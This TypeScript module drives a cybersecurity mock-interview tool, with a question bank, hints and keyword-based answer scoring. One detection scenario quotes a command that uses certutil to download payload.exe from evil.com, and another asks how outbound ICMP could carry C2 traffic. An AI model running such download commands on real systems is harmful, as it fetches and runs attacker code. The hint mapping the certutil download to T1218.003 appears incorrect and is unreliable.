import { projects } from "@/data/projects";
import { skills } from "@/data/skills";
import { galaxySkills } from "@/data/skills-galaxy";
import { vaultCertifications, certificationRoadmap } from "@/data/certifications-vault";
import { blogPosts } from "@/data/blog";
import { experiences } from "@/data/experience";

export type RoleId =
  | "soc-analyst" | "penetration-tester" | "security-engineer" | "cloud-security-engineer"
  | "threat-hunter" | "incident-responder" | "blue-team" | "red-team"
  | "devsecops" | "intern" | "general";

export type Difficulty = "beginner" | "intermediate" | "advanced" | "expert";

export type QuestionCategory =
  | "networking" | "linux" | "windows" | "python" | "cloud" | "soc" | "threat-hunting"
  | "web-security" | "owasp" | "mitre" | "siem" | "incident-response" | "forensics"
  | "reverse-engineering" | "osint" | "cryptography" | "automation" | "behavioral"
  | "architecture" | "project-walkthrough" | "research";

export interface InterviewQuestion {
  id: string;
  type: "technical" | "behavioral" | "scenario" | "architecture" | "project" | "research";
  category: QuestionCategory;
  difficulty: Difficulty;
  role: RoleId[];
  question: string;
  context?: string;
  keyConcepts: string[];
  portfolioLinks?: { label: string; href: string }[];
  hints: string[];
  exampleStructure?: string;
}

export interface InterviewConfig {
  role: RoleId;
  difficulty: Difficulty;
  duration: number;
  questionCount: number;
  includeBehavioral: boolean;
  includeScenario: boolean;
  includePortfolio: boolean;
  includeTechnical: boolean;
}

export interface InterviewResponse {
  questionId: string;
  question: string;
  answer: string;
  feedback: FeedbackResult;
  timestamp: number;
}

export interface FeedbackResult {
  strengths: string[];
  improvements: string[];
  missingConcepts: string[];
  relatedProjects: { title: string; href: string }[];
  relatedSkills: string[];
  relatedCerts: string[];
  suggestedReading: { label: string; href: string }[];
  hints: string[];
}

export interface InterviewSession {
  id: string;
  role: RoleId;
  difficulty: Difficulty;
  config: InterviewConfig;
  questions: InterviewQuestion[];
  responses: InterviewResponse[];
  startedAt: number;
  completedAt?: number;
}

export const ROLE_LABELS: Record<RoleId, string> = {
  "soc-analyst": "SOC Analyst",
  "penetration-tester": "Penetration Tester",
  "security-engineer": "Security Engineer",
  "cloud-security-engineer": "Cloud Security Engineer",
  "threat-hunter": "Threat Hunter",
  "incident-responder": "Incident Responder",
  "blue-team": "Blue Team Analyst",
  "red-team": "Red Team Operator",
  "devsecops": "DevSecOps Engineer",
  "intern": "Cybersecurity Intern",
  "general": "General Cybersecurity",
};

export const ROLE_DESCRIPTIONS: Record<RoleId, string> = {
  "soc-analyst": "Monitor, detect, and respond to security threats in a Security Operations Center environment.",
  "penetration-tester": "Simulate real-world attacks to identify vulnerabilities before adversaries can exploit them.",
  "security-engineer": "Design, implement, and maintain security systems, controls, and infrastructure.",
  "cloud-security-engineer": "Secure cloud infrastructure across AWS, Azure, and GCP platforms.",
  "threat-hunter": "Proactively search for advanced persistent threats and indicators of compromise.",
  "incident-responder": "Lead incident response investigations from detection through containment and recovery.",
  "blue-team": "Defend enterprise networks through detection engineering, monitoring, and hardening.",
  "red-team": "Execute adversarial simulations and advanced persistent threat operations.",
  "devsecops": "Integrate security into CI/CD pipelines and infrastructure-as-code workflows.",
  "intern": "Foundational cybersecurity concepts and hands-on technical skills assessment.",
  "general": "Broad assessment covering fundamental cybersecurity knowledge and critical thinking.",
};

const INTERVIEW_QUESTIONS: InterviewQuestion[] = [
  // ── Networking ──
  { id: "net-1", type: "technical", category: "networking", difficulty: "beginner", role: ["soc-analyst", "intern", "general", "blue-team"],
    question: "Explain the OSI model and which layers are most relevant to security monitoring.",
    context: "Focus on layers 2-7 and how each layer provides different visibility for security analysts.",
    keyConcepts: ["OSI Model", "Packet Analysis", "Network Layers", "Protocol Encapsulation"],
    portfolioLinks: [{ label: "NetDefend Project", href: "/projects/netdefend" }],
    hints: ["Think about where firewalls operate", "Consider how IDS/IPS systems inspect traffic", "Which layer handles IP addresses?"],
    exampleStructure: "Start with layer 2 (Data Link), explain encapsulation, then focus on layers 3-7 for security monitoring." },
  { id: "net-2", type: "technical", category: "networking", difficulty: "intermediate", role: ["soc-analyst", "penetration-tester", "incident-responder", "general"],
    question: "How would you detect and investigate DNS tunneling exfiltration?",
    context: "DNS tunneling can bypass traditional network controls. Describe detection and analysis approaches.",
    keyConcepts: ["DNS Protocol", "Tunneling", "Traffic Analysis", "Exfiltration Detection"],
    portfolioLinks: [{ label: "Network Forensics", href: "/projects/forensic-analyzer" }],
    hints: ["Look for unusual query sizes", "Check TXT record lengths", "Monitor volume per domain"],
    exampleStructure: "Explain normal DNS traffic patterns, then describe anomalous indicators that suggest tunneling." },
  { id: "net-3", type: "scenario", category: "networking", difficulty: "advanced", role: ["penetration-tester", "red-team", "threat-hunter"],
    question: "During an engagement, you discover that ICMP traffic is allowed outbound from the internal network. How could you leverage this for C2 communication?",
    context: "Describe how ICMP can be abused for command and control, and how it would appear on the wire.",
    keyConcepts: ["ICMP Tunneling", "C2 Infrastructure", "Covert Channels", "Network Evasion"],
    portfolioLinks: [{ label: "RedOps C2 Framework", href: "/projects/redops" }],
    hints: ["ICMP echo request/reply payload fields", "Packet size and timing analysis", "How would defenders detect this?"],
    exampleStructure: "Explain ICMP packet structure, describe how data fits in payload fields, then discuss detection methods." },

  // ── Linux ──
  { id: "lin-1", type: "technical", category: "linux", difficulty: "beginner", role: ["soc-analyst", "intern", "general", "security-engineer"],
    question: "What Linux commands would you use to investigate a potentially compromised system?",
    context: "List commands for checking processes, network connections, and file changes.",
    keyConcepts: ["Linux Administration", "Process Investigation", "File Integrity", "Log Analysis"],
    portfolioLinks: [{ label: "Linux Skills", href: "/skills/linux" }],
    hints: ["Think about ps, netstat, lsof", "Check /proc filesystem", "Consider auditd and syslog"],
    exampleStructure: "Start with process listing, then network connections, then file system changes." },
  { id: "lin-2", type: "technical", category: "linux", difficulty: "intermediate", role: ["soc-analyst", "incident-responder", "blue-team", "threat-hunter"],
    question: "Describe how you would use Linux auditd to detect privilege escalation attempts.",
    context: "Focus on audit rules that capture key events like execve, setuid, and file access.",
    keyConcepts: ["auditd", "Linux Security", "Privilege Escalation", "Audit Rules"],
    portfolioLinks: [{ label: "Forensic Analyzer", href: "/projects/forensic-analyzer" }],
    hints: ["KEY_EXECVE and SYS_ADMIN", "Monitor /etc/passwd and /etc/shadow", "aureport and ausearch"],
    exampleStructure: "Describe auditd architecture, key rules, and how alerts are generated and analyzed." },
  { id: "lin-3", type: "scenario", category: "linux", difficulty: "expert", role: ["incident-responder", "threat-hunter"],
    question: "A Linux server has been compromised. Describe your step-by-step approach to performing live forensics while preserving evidence integrity.",
    context: "Emphasize order of volatility, chain of custody, and key artifacts to collect.",
    keyConcepts: ["Live Forensics", "Order of Volatility", "Memory Acquisition", "Artifact Collection"],
    portfolioLinks: [{ label: "Memory Forensics Guide", href: "/projects/forensic-analyzer" }],
    hints: ["What would you collect first?", "How do you ensure evidence admissibility?", "Which tools are safe to run on a live system?"],
    exampleStructure: "Explain volatility order, describe each collection step, then discuss analysis strategy." },

  // ── Python ──
  { id: "py-1", type: "technical", category: "python", difficulty: "beginner", role: ["intern", "general", "soc-analyst"],
    question: "Write a Python script that reads a log file and extracts all IP addresses with more than 10 failed login attempts.",
    context: "Demonstrate file handling, regex, and data aggregation.",
    keyConcepts: ["Python I/O", "Regular Expressions", "Data Aggregation", "Log Parsing"],
    portfolioLinks: [{ label: "Python Security Automation", href: "/skills/python" }],
    hints: ["Use re.findall for IP extraction", "Consider collections.Counter", "What log format are you parsing?"],
    exampleStructure: "Read file line by line, extract IPs with regex, count occurrences, filter threshold." },
  { id: "py-2", type: "technical", category: "python", difficulty: "advanced", role: ["penetration-tester", "security-engineer", "devsecops"],
    question: "Design a Python-based port scanner that uses asyncio for concurrent scanning while implementing proper rate limiting and error handling.",
    context: "Focus on async patterns, network programming, and responsible scanning practices.",
    keyConcepts: ["Asyncio", "Network Scanning", "Rate Limiting", "Error Handling"],
    portfolioLinks: [{ label: "AutoPwn Project", href: "/projects/autopwn" }],
    hints: ["asyncio.open_connection for TCP", "Semaphore for rate limiting", "Handle connection refused gracefully"],
    exampleStructure: "Explain async architecture, describe scanning logic, then rate limiting implementation." },

  // ── Cloud Security ──
  { id: "cloud-1", type: "technical", category: "cloud", difficulty: "intermediate", role: ["cloud-security-engineer", "security-engineer", "devsecops"],
    question: "How would you secure an AWS S3 bucket that needs to be publicly accessible for a web application?",
    context: "Balance accessibility with security controls including bucket policies, IAM, and logging.",
    keyConcepts: ["AWS S3 Security", "IAM Policies", "Bucket Policies", "Access Logging"],
    portfolioLinks: [{ label: "CloudSec Enforcer", href: "/projects/cloudsec-enforcer" }],
    hints: ["Consider CloudFront as a CDN proxy", "Enable S3 server access logging", "Use pre-signed URLs where possible"],
    exampleStructure: "Start with least privilege, then CDN protection, then monitoring and logging." },
  { id: "cloud-2", type: "scenario", category: "cloud", difficulty: "expert", role: ["cloud-security-engineer", "incident-responder", "threat-hunter"],
    question: "A Lambda function in your AWS environment is making API calls to a region you never use. Walk through your investigation process.",
    context: "Describe detection, isolation, and investigation steps for a potentially compromised serverless function.",
    keyConcepts: ["AWS Lambda Security", "CloudTrail", "Serverless Forensics", "IAM Analysis"],
    portfolioLinks: [{ label: "CloudSec Enforcer", href: "/projects/cloudsec-enforcer" }, { label: "AWS Security Cert", href: "/certifications" }],
    hints: ["Check CloudTrail logs for the function", "Review IAM role permissions", "Examine environment variables"],
    exampleStructure: "Describe detection triggers, then step through investigation, containment, and recovery." },

  // ── SOC / SIEM ──
  { id: "soc-1", type: "technical", category: "soc", difficulty: "intermediate", role: ["soc-analyst", "blue-team", "general", "incident-responder"],
    question: "Explain the difference between a SIEM and a SOAR, and how they work together in a SOC environment.",
    context: "Describe the roles of each system and their integration points.",
    keyConcepts: ["SIEM", "SOAR", "SOC Operations", "Automation"],
    portfolioLinks: [{ label: "Sentinel AI SOC", href: "/projects/sentinel-ai" }],
    hints: ["SIEM collects and correlates", "SOAR automates response", "How do playbooks fit in?"],
    exampleStructure: "Define each system, then explain their interaction in the incident response workflow." },
  { id: "soc-2", type: "scenario", category: "soc", difficulty: "advanced", role: ["soc-analyst", "incident-responder", "threat-hunter"],
    question: "Your SIEM is generating 10,000 alerts per day with a 95% false positive rate. How would you reduce the noise while maintaining detection coverage?",
    context: "Describe tuning, correlation, and automation strategies for alert fatigue.",
    keyConcepts: ["Alert Tuning", "False Positive Reduction", "Correlation Rules", "SOC Metrics"],
    portfolioLinks: [{ label: "Sentinel AI SOC Dashboard", href: "/projects/sentinel-ai" }],
    hints: ["Start with the noisiest rules", "Implement alert aggregation", "Use ML-based anomaly scoring"],
    exampleStructure: "Analyze current alert distribution, then describe systematic tuning approach." },
  { id: "soc-3", type: "technical", category: "soc", difficulty: "expert", role: ["soc-analyst", "security-engineer", "threat-hunter"],
    question: "Design a detection rule for identifying Kerberoasting activity in Windows event logs.",
    context: "Describe the attack technique, relevant Windows event IDs, and detection logic.",
    keyConcepts: ["Kerberoasting", "Windows Event Logs", "Active Directory Security", "Detection Engineering"],
    portfolioLinks: [{ label: "RedOps AD Attacks", href: "/projects/redops" }, { label: "CRTP Certification", href: "/certifications" }],
    hints: ["Event ID 4769 with RC4 encryption", "Unusual volume of TGS requests", "Service account anomalies"],
    exampleStructure: "Explain the attack, list relevant event IDs, describe detection logic and correlation." },

  // ── MITRE ATT&CK ──
  { id: "mitre-1", type: "technical", category: "mitre", difficulty: "intermediate", role: ["soc-analyst", "blue-team", "threat-hunter", "general"],
    question: "How do you use the MITRE ATT&CK framework to improve threat detection coverage?",
    context: "Explain mapping detections to techniques, identifying gaps, and prioritizing coverage.",
    keyConcepts: ["MITRE ATT&CK", "Detection Coverage", "Gap Analysis", "Threat-Informed Defense"],
    portfolioLinks: [{ label: "Sentinel AI Coverage", href: "/projects/sentinel-ai" }],
    hints: ["Map existing detections to techniques", "Identify high-impact gaps", "Use ATT&CK Navigator"],
    exampleStructure: "Explain framework, describe mapping process, then coverage improvement strategy." },
  { id: "mitre-2", type: "scenario", category: "mitre", difficulty: "advanced", role: ["threat-hunter", "incident-responder", "red-team"],
    question: "You detect a process running 'certutil.exe -urlcache -split -f http://evil.com/payload.exe'. Map this to MITRE ATT&CK techniques and describe the full attack chain.",
    context: "Identify the technique, tactic, and potential attack stages.",
    keyConcepts: ["MITRE Technique Mapping", "Signed Binary Abuse", "Living Off the Land", "Tactic Identification"],
    portfolioLinks: [{ label: "Threat Hunter Project", href: "/projects/threat-hunter" }],
    hints: ["Which technique uses certutil for download?", "What tactic does this represent?", "What could follow this stage?"],
    exampleStructure: "Map T1218.003, describe the attack chain, then discuss detection and prevention." },

  // ── Web Security ──
  { id: "web-1", type: "technical", category: "web-security", difficulty: "beginner", role: ["intern", "general", "penetration-tester"],
    question: "What is SQL injection and how does it work?",
    context: "Explain the vulnerability, attack vectors, and basic exploitation.",
    keyConcepts: ["SQL Injection", "Web Vulnerabilities", "Input Validation", "OWASP Top 10"],
    portfolioLinks: [{ label: "Web Security Skills", href: "/skills/web-security" }],
    hints: ["Think about unsanitized input", "Different types: in-band, blind, out-of-band", "Consider parameterized queries"],
    exampleStructure: "Define SQLi, explain how it works with an example, then describe prevention." },
  { id: "web-2", type: "scenario", category: "web-security", difficulty: "advanced", role: ["penetration-tester", "security-engineer", "general"],
    question: "You find a subdomain takeover vulnerability. Describe how you would exploit it and what the potential impact is.",
    context: "Explain DNS configuration issues, verification, and proof of concept.",
    keyConcepts: ["Subdomain Takeover", "DNS Security", "Cloud Infrastructure", "OWASP Top 10"],
    portfolioLinks: [{ label: "PhishShield Project", href: "/projects/phishshield" }],
    hints: ["Check CNAME records to unclaimed services", "Verify ownership through TXT records", "Could this be used for phishing?"],
    exampleStructure: "Describe discovery, verification, exploitation steps, then mitigation." },

  // ── Behavioral ──
  { id: "beh-1", type: "behavioral", category: "behavioral", difficulty: "beginner", role: ["intern", "general", "soc-analyst", "security-engineer"],
    question: "Tell me about a time you had to troubleshoot a complex technical problem. What was your approach?",
    context: "Describe a real technical challenge and your systematic approach to solving it.",
    keyConcepts: ["Problem Solving", "Analytical Thinking", "Methodology", "Communication"],
    portfolioLinks: [],
    hints: ["Structure with STAR method", "Describe your thought process", "What was the outcome?"],
    exampleStructure: "Use Situation, Task, Action, Result format to describe the experience." },
  { id: "beh-2", type: "behavioral", category: "behavioral", difficulty: "intermediate", role: ["incident-responder", "blue-team", "threat-hunter"],
    question: "Describe a high-pressure security incident you responded to. How did you prioritize your actions?",
    context: "Explain triage, communication, and decision-making under pressure.",
    keyConcepts: ["Incident Triage", "Crisis Management", "Prioritization", "Team Communication"],
    portfolioLinks: [{ label: "Incident Response Experience", href: "/projects/sentinel-ai" }],
    hints: ["What was the severity?", "How did you contain the incident?", "Post-incident improvements?"],
    exampleStructure: "Describe the incident, triage process, containment actions, and lessons learned." },

  // ── Project Walkthrough ──
  { id: "proj-1", type: "project", category: "project-walkthrough", difficulty: "intermediate", role: ["soc-analyst", "security-engineer", "general"],
    question: "Walk me through the architecture of the Sentinel AI SOC Dashboard project.",
    context: "Describe the system architecture, key components, and design decisions.",
    keyConcepts: ["System Architecture", "Event-Driven Design", "Microservices", "Security Platform"],
    portfolioLinks: [{ label: "Sentinel AI", href: "/projects/sentinel-ai" }],
    hints: ["How are events collected?", "What is the detection pipeline?", "How is data stored and queried?"],
    exampleStructure: "Start with high-level architecture, then detail each component layer." },
  { id: "proj-2", type: "project", category: "project-walkthrough", difficulty: "advanced", role: ["penetration-tester", "red-team", "security-engineer"],
    question: "Explain the architecture of RedOps and how it handles C2 communication for adversarial simulations.",
    context: "Describe the C2 framework design, communication patterns, and operational security considerations.",
    keyConcepts: ["C2 Infrastructure", "Red Team Operations", "Network Evasion", "Adversarial Simulation"],
    portfolioLinks: [{ label: "RedOps C2", href: "/projects/redops" }],
    hints: ["How does the implant communicate?", "What OPSEC measures are in place?", "How is traffic disguised?"],
    exampleStructure: "Describe implant architecture, C2 protocol, and evasion techniques." },
  { id: "proj-3", type: "project", category: "project-walkthrough", difficulty: "intermediate", role: ["cloud-security-engineer", "devsecops", "security-engineer"],
    question: "How does the CloudSec Enforcer project automate cloud security policy enforcement?",
    context: "Explain the policy-as-code approach, compliance monitoring, and automated remediation.",
    keyConcepts: ["Policy-as-Code", "Cloud Security", "Automation", "Compliance"],
    portfolioLinks: [{ label: "CloudSec Enforcer", href: "/projects/cloudsec-enforcer" }],
    hints: ["How are policies defined?", "What triggers enforcement?", "How is compliance measured?"],
    exampleStructure: "Describe policy definition, detection loop, and automated remediation pipeline." },

  // ── Research Discussion ──
  { id: "res-1", type: "research", category: "research", difficulty: "advanced", role: ["security-engineer", "threat-hunter", "general"],
    question: "What is zero trust architecture and how would you implement it in an existing enterprise network?",
    context: "Based on the research article, explain principles and practical implementation challenges.",
    keyConcepts: ["Zero Trust", "Network Security", "Architecture Migration", "Micro-segmentation"],
    portfolioLinks: [{ label: "Zero Trust Research", href: "/blog/zero-trust-architecture-deep-dive" }],
    hints: ["Never trust, always verify", "Micro-segmentation is key", "Consider identity as the new perimeter"],
    exampleStructure: "Define zero trust principles, describe migration strategy, address common challenges." },
  { id: "res-2", type: "research", category: "research", difficulty: "expert", role: ["cloud-security-engineer", "devsecops", "security-engineer"],
    question: "Based on your Kubernetes security research, describe the most critical security controls for a production cluster.",
    context: "Reference the Kubernetes security hardening guide and practical implementation experience.",
    keyConcepts: ["Kubernetes Security", "Container Hardening", "RBAC", "Pod Security"],
    portfolioLinks: [{ label: "K8s Hardening Guide", href: "/blog/kubernetes-security-hardening" }, { label: "K8s Hardener", href: "/projects/k8s-hardener" }],
    hints: ["RBAC is the first line of defense", "Pod Security Standards", "Network policies for segmentation"],
    exampleStructure: "Start with RBAC, then network policies, pod security, and runtime monitoring." },
];

export { INTERVIEW_QUESTIONS };

export function getQuestionsForRole(role: RoleId, difficulty: Difficulty, count: number, config: InterviewConfig): InterviewQuestion[] {
  let pool = INTERVIEW_QUESTIONS.filter(q => q.role.includes(role));

  if (!config.includeBehavioral) pool = pool.filter(q => q.type !== "behavioral");
  if (!config.includeScenario) pool = pool.filter(q => q.type !== "scenario");
  if (!config.includePortfolio) pool = pool.filter(q => q.type !== "project");
  if (!config.includeTechnical) pool = pool.filter(q => q.type !== "technical");

  const difficultyOrder = ["beginner", "intermediate", "advanced", "expert"];
  const diffIdx = difficultyOrder.indexOf(difficulty);

  const scored = pool.map(q => {
    const qDiffIdx = difficultyOrder.indexOf(q.difficulty);
    const diffScore = -Math.abs(qDiffIdx - diffIdx);
    const catBonus = q.category === "networking" || q.category === "linux" || q.category === "soc" ? 1 : 0;
    return { question: q, score: diffScore + catBonus + Math.random() * 0.1 };
  });

  scored.sort((a, b) => b.score - a.score);
  const selected = scored.slice(0, Math.min(count, scored.length));

  if (selected.length < count) {
    const remaining = INTERVIEW_QUESTIONS.filter(q => !selected.find(s => s.question.id === q.id));
    const fillers = remaining.sort(() => Math.random() - 0.5).slice(0, count - selected.length);
    selected.push(...fillers.map(q => ({ question: q, score: 0 })));
  }

  return selected.map(s => s.question);
}

export function evaluateResponse(question: InterviewQuestion, answer: string): FeedbackResult {
  const ans = answer.toLowerCase();
  const strengths: string[] = [];
  const improvements: string[] = [];
  const missingConcepts: string[] = [];
  const relatedProjects: { title: string; href: string }[] = [];
  const relatedSkills: string[] = [];
  const relatedCerts: string[] = [];
  const suggestedReading: { label: string; href: string }[] = [];

  const conceptsCovered: string[] = [];
  for (const concept of question.keyConcepts) {
    if (ans.includes(concept.toLowerCase())) {
      conceptsCovered.push(concept);
    } else {
      const words = concept.toLowerCase().split(" ");
      const partial = words.filter(w => w.length > 3 && ans.includes(w));
      if (partial.length >= Math.ceil(words.length / 2)) {
        conceptsCovered.push(concept);
      } else {
        missingConcepts.push(concept);
      }
    }
  }

  if (conceptsCovered.length > 0) {
    strengths.push(`Addressed ${conceptsCovered.length}/${question.keyConcepts.length} key concepts: ${conceptsCovered.join(", ")}`);
  }

  if (ans.length > 100) {
    strengths.push("Provided a detailed response with substantial technical depth");
  }
  if (ans.length < 50) {
    improvements.push("Response could benefit from more technical detail and specific examples");
  }
  if (ans.includes("example") || ans.includes("for instance") || ans.includes("such as")) {
    strengths.push("Used concrete examples to illustrate technical points");
  } else {
    improvements.push("Including specific examples or real-world scenarios would strengthen the response");
  }
  if (ans.includes("however") || ans.includes("depending") || ans.includes("trade-off") || ans.includes("balance")) {
    strengths.push("Demonstrated nuanced understanding of trade-offs and context-dependent decisions");
  }

  if (question.portfolioLinks) {
    for (const link of question.portfolioLinks) {
      relatedProjects.push({ title: link.label, href: link.href });
    }
  }

  const matchedSkills = skills.filter(s => ans.includes(s.name.toLowerCase()));
  for (const s of matchedSkills.slice(0, 5)) {
    relatedSkills.push(s.name);
  }
  if (matchedSkills.length === 0 && conceptsCovered.length > 0) {
    const related = galaxySkills.filter(s => conceptsCovered.some(c => c.toLowerCase().includes(s.name.toLowerCase())));
    for (const s of related.slice(0, 3)) relatedSkills.push(s.name);
  }

  const matchedCerts = vaultCertifications.filter(c => c.skills?.some(sk => ans.includes(sk.toLowerCase())));
  for (const c of matchedCerts.slice(0, 3)) {
    relatedCerts.push(c.name.split("(")[0].trim());
  }

  if (question.hints && question.hints.length > 0) {
    const usedHints = question.hints.filter(h => {
      const hWords = h.toLowerCase().split(" ").filter(w => w.length > 4);
      return hWords.some(w => ans.includes(w));
    });
    if (usedHints.length < question.hints.length) {
      for (const hint of question.hints) {
        const hWords = hint.toLowerCase().split(" ").filter(w => w.length > 4);
        if (!hWords.some(w => ans.includes(w))) {
          suggestedReading.push({ label: hint, href: "#" });
        }
      }
    }
  }

  if (missingConcepts.length > 1) {
    improvements.push(`Consider covering ${missingConcepts.slice(0, 3).join(", ")} in your response`);
  }

  if (strengths.length === 0) strengths.push("Response received for evaluation");

  return {
    strengths: strengths.slice(0, 4),
    improvements: improvements.slice(0, 3),
    missingConcepts: missingConcepts.slice(0, 5),
    relatedProjects: relatedProjects.slice(0, 4),
    relatedSkills: relatedSkills.slice(0, 6),
    relatedCerts: relatedCerts.slice(0, 3),
    suggestedReading: suggestedReading.slice(0, 3),
    hints: question.hints.slice(0, 3),
  };
}

export function generateInterviewSummary(session: InterviewSession): {
  summary: string;
  topicsCovered: string[];
  strengths: string[];
  improvements: string[];
  recommendedProjects: { title: string; href: string }[];
  recommendedLearning: string[];
  questionHistory: { question: string; answer: string }[];
} {
  const topics = new Set<string>();
  const allStrengths = new Set<string>();
  const allImprovements = new Set<string>();
  const allProjects = new Map<string, string>();

  for (const r of session.responses) {
    for (const s of r.feedback.strengths) allStrengths.add(s);
    for (const imp of r.feedback.improvements) allImprovements.add(imp);
    for (const p of r.feedback.relatedProjects) allProjects.set(p.href, p.title);
    for (const s of r.feedback.relatedSkills) topics.add(s);
  }

  for (const q of session.questions) {
    topics.add(q.category.replace(/-/g, " "));
  }

  const role = ROLE_LABELS[session.role];
  const summary = `Interview completed for ${role} at ${session.difficulty} level. ${session.responses.length} questions answered covering ${topics.size} topic areas. The candidate demonstrated knowledge across ${Array.from(topics).slice(0, 5).join(", ")}.`;

  return {
    summary,
    topicsCovered: Array.from(topics).slice(0, 12),
    strengths: Array.from(allStrengths).slice(0, 5),
    improvements: Array.from(allImprovements).slice(0, 5),
    recommendedProjects: Array.from(allProjects.entries()).slice(0, 6).map(([href, title]) => ({ title, href })),
    recommendedLearning: Array.from(allImprovements).slice(0, 4),
    questionHistory: session.responses.map(r => ({ question: r.question, answer: r.answer })),
  };
}
